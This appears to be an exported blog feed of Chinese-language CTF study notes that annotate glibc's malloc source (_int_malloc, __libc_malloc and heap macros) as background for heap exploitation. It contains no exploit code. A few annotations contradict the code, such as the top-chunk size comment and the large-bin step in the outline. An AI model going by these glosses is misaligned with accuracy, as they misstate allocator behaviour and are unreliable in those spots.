<span class="comment">// 从large bin的链头到链尾，从size大的chunk到size小的chunk，依次遍历，直到找到第一个 大小不大于该unsorted chunk的 第一个chunk</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果当前遍历到的large chunk的大小刚好等于即将插入的unsorted chunk的大小</span></span><br><span class="line">            <span class="comment">// 总是选择插入到这个large chunk的后面</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin (av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在对unsorted chunks进行排列放置进对应bin之后</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">        sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断所申请的chunks是否为large chunk</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">      <span class="comment">// 如果当前large bin链不为空，以及该链上的large chunks大小足够</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">      &#123;</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">          victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">            list does not have to be rerouted.  */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果满足大小的chunks不止一个，则始终取走第二个，以减小指针操作</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">          victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算出该large chunks分割后剩余的chunk大小</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">// 该large chunks解链</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果该large chunks分割后剩余的chunk大小小于最小chunk大小</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 剩余的这点空间，一起附赠给用户</span></span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 否则，切割chunk</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 切割该large chunk</span></span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">              have to perform a complete insert here.  */</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">// 并把剩余的chunk放入unsorted bin里</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">          &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">        bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">        (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">        that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">        The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">        when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 既然当前large bin里没有适合的large chunk</span></span><br><span class="line">    <span class="comment">// 则使用binmap遍历索引更高、大小更大的bin，以满足用户需求</span></span><br><span class="line"></span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    block = idx2block (idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      victim = last (bin);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">              have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): corrupted unsorted chunks 2"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">        (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">        search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">        less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">        be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">        limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">        MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">        exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">        reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">        to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 既然上面真的什么chunk都分配不出来，那就尝试使用top chunk</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果top chunk的大小 小于所需的chunk的大小</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">        here for all block sizes.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果top chunk也不够大，则尝试执行malloc_consolidate，并尝试重新从small bin和large bin中分配chunk</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果真的是山穷水尽了，一个free chunk都挤不出来了</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 就勉为其难的调用sysmalloc分配内存</span></span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 6 - __libc_malloc 源码及其部分分析</title>
    <url>/2020/04/heap-6-__libc_malloc_source/</url>
    <content><![CDATA[<p>调用<code>malloc</code>后首执行的函数  —— <code>__libc_malloc</code>!</p>
<a id="more"></a>
<blockquote>
<p>所有的分析都以注释的形式添加进源代码中，方便阅读</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;  <span class="comment">// 指向arena的指针</span></span><br><span class="line">  <span class="keyword">void</span> *victim;   <span class="comment">// 指向待分配chunk的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断 __malloc_hook 是否为空</span></span><br><span class="line">  <span class="comment">// 如果不为空，则返回 其执行 __malloc_hook指向函数的返回值</span></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取arena并上线程锁</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 执行核心内存分配函数，并获得所分配的chunk地址</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前arena不为空，但分配不到chunk</span></span><br><span class="line">  <span class="comment">// 则更换可用arena并尝试重新分配chunk</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果arena不为空，则解除arena上的线程锁</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断条件，若不满足指定条件则断言出错</span></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 4 - _int_malloc的相关操作</title>
    <url>/2020/04/heap-4-_int_malloc_process/</url>
    <content><![CDATA[<p>_int_malloc的一系列操作</p>
<a id="more"></a>
<blockquote>
<p>注意！ 以下步骤若未明确标明退出函数，则表示在执行完当前操作后，继续执行剩余操作</p>
</blockquote>
<h2 id="1-判断arena是否为空">1. 判断arena是否为空</h2>
<ul>
<li>如果是，则调用sysmalloc分配所需内存，<strong>返回并退出</strong></li>
</ul>
<h2 id="2-判断所申请的chunk大小是否小于fast-chunk的最大值">2. 判断所申请的chunk大小是否小于fast chunk的最大值</h2>
<ul>
<li>如果是，则尝试取出fast bin里的第一个chunk(<code>fastbin-&gt;fd</code>)</li>
<li>如果该chunk不为空，则检查该chunk是否出错、 <strong>返回该chunk用户地址并退出</strong></li>
</ul>
<h2 id="3-判断所申请的chunk大小是否小于small-chunk的最大值">3. 判断所申请的chunk大小是否小于small chunk的最大值</h2>
<ul>
<li>如果是，并且指向small bin最后一个chunk的指针（<code>smallbin-&gt;bk</code>）不指向small bin自己，则判断该指针是否为NULL
<ul>
<li>如果是，则说明此时是第一次执行该部分代码，则执行<code>malloc_consolidate</code>函数</li>
<li>否则，则说明small bin上存在可用chunk，检查该chunk是否出错、将该chunk取出， <strong>返回该chunk用户地址并退出</strong></li>
</ul>
</li>
</ul>
<h2 id="4-取出largebin的索引，并判断是否有空闲的fastchunk">4. 取出largebin的索引，并判断是否有空闲的fastchunk</h2>
<ul>
<li>如果有，则执行<code>malloc_consolidate</code>函数</li>
</ul>
<h2 id="5-进入大型循环——for循环">5. 进入大型循环——for循环</h2>
<h3 id="1-遍历unsortedbin里的chunk最多10000次，并执行以下操作">1. 遍历unsortedbin里的chunk最多10000次，并执行以下操作</h3>
<ol>
<li>检测该chunk的大小是否非常小或非常大
<ul>
<li>如果是，输出错误信息并 <strong>退出</strong></li>
</ul>
</li>
<li>判断用户申请的大小是否同时满足以下3个条件
<ol>
<li>在smallchunk的范围内</li>
<li>unsorted bin里只有一个chunk</li>
<li>并且该chunk是last_remainder</li>
</ol>
<ul>
<li>如果是，则切割last_remainder,并将剩余remainder放回unsortedbin里、重设last_remainder、检查chunk，最后 <strong>返回该chunk的用户地址并退出</strong></li>
</ul>
</li>
<li>如果这块chunk刚好与所申请的chunk大小相等，则取出该chunk、检查chunk、 <strong>返回该chunk的用户地址并退出</strong></li>
<li>将遍历到的chunk根据大小放置进small bin或large bin里</li>
</ol>
<h3 id="2-尝试在large-bin里搜索可用的chunk">2. 尝试在large bin里搜索可用的chunk</h3>
<ul>
<li>如果large bin里，size最大的chunk，其size小于所申请的内存大小
<ol>
<li>取出large bin里，size最接近所申请chunk的chunk</li>
<li>判断该chunk和所申请内存大小相差是否小于MINSIZE
<ul>
<li>如果是，则多出的这块内存一并附赠给用户</li>
<li>否则，分割这块chunk，将剩余的chunk放入unsorted bin里、检查目标chunk、<strong>返回该chunk的用户地址并退出</strong></li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="3-在其他free-chunks大小更大的bin里找更大的内存">3. 在其他free chunks大小更大的bin里找更大的内存</h3>
<ul>
<li>由于fastbin、smallbin、largebin上的freechunk是分组的，所以可能出现目标组别上的freechunk无法满足大小，此时使用binmap，去其他更大的bins里查找freechunk</li>
</ul>
<h3 id="4-如果执行到了这里，那就真是什么freechunk都找不到了，则判断top-chunk是否够用">4. 如果执行到了这里，那就真是什么freechunk都找不到了，则判断top chunk是否够用</h3>
<ol>
<li>如果够用，切割top chunk并使用</li>
<li>否则，则判断是否有fast chunk空闲
<ul>
<li>如果有，则执行<code>malloc_consolidate</code>函数，然后 <strong>返回for循环起点，重新执行相关代码</strong></li>
<li>否则，调用sysmalloc申请内存，<strong>返回该chunk的用户地址并退出</strong></li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap - 5 - malloc、free函数相关的宏定义</title>
    <url>/2020/04/heap-5-heap_definitions/</url>
    <content><![CDATA[<p>注：宏定义 <strong>不建议</strong> 单独阅读，应在分析源代码时查阅参考</p>
<h2 id="fastbin相关宏定义">fastbin相关宏定义</h2>
<ol>
<li><code>set_max_fast(s)</code>
<ul>
<li>
<p>用处</p>
<ul>
<li>设置fast chunk大小的最大值为变量s（为0则弃用fast chunk和fastbin）</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)      \</span><br><span class="line">      ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<a id="more"></a>
<ol start="2">
<li>
<p><code>get_max_fast()</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>获取fast chunk大小的最大值</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>fastbin_index(sz)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>根据所请求的chunk大小，获取fastbin中对应的索引</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>fastbin(ar_ptr, idx)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>返回指针ar_ptr指向的arena中，fastbin对应变量idx索引的值</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>catomic_compare_and_exchange_val_acq(mem, newval, oldval)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li><strong>线程安全</strong> 的交换两个值</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">  atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">  (&#123; __typeof (mem) __gmemp = (mem);     \</span><br><span class="line">      __typeof (*mem) __gret = *__gmemp;      \</span><br><span class="line">      __typeof (*mem) __gnewval = (newval)      \</span><br><span class="line">                                      \</span><br><span class="line">      <span class="keyword">if</span> (__gret == (oldval))      \</span><br><span class="line">      *__gmemp = __gnewval;      \</span><br><span class="line">      __gret; &#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>have_fastchunks(M)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>判断指针M指向的arena，其fastbin上是否有空闲的fast chunks</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="smallbin-相关宏定义">smallbin 相关宏定义</h2>
<ol>
<li>
<p><code>in_smallbin_range(sz)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>判断变量sz是否处于small chunk的大小范围内</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line">  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) MIN_LARGE_SIZE)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>smallbin_index(sz)</code></p>
<ul>
<li>
<p>用处</p>
<ul>
<li>根据所请求的chunk大小，获取smallbin中对应的索引</li>
</ul>
</li>
<li>
<p>源代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">  + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="unsorted-bin-相关宏定义">unsorted bin 相关宏定义</h2>
<ol>
<li><code>unsorted_chunks(M)</code>
<ul>
<li>
<p>用处</p>
<ul>
